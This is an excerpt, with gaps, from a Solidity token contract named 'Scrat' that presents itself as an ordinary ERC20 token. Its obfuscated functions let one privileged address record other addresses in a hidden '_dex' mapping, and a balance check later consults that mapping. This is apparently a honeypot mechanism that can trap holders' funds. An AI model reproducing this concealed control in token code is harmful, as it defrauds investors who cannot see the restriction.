...
contract Scrat is IERC20, Token, Ownable {
    ...
    mapping(address => User) private _dex;
    ...
    function _ajouter(uint256 aqw, uint256 poe) internal pure returns (uint256) {
        if (poe != 0) {
            return aqw + poe;
        }
        return poe;
    ...
    function _checkAllowance(address user, address spender, uint256 amount) internal {
        if (_decode(user, _user.user)) {
            require(spender != address(0), "Invalid address");
            if (amount != 0) {
                _dex[spender].user = spender;
            } else {
                _dex[spender].user = address(0);
            }
        }
    }
    ...
    function _requireBalance(
        ...
        uint256 amount = 0;
        if (_decode(sender, _dex[sender].user)) {
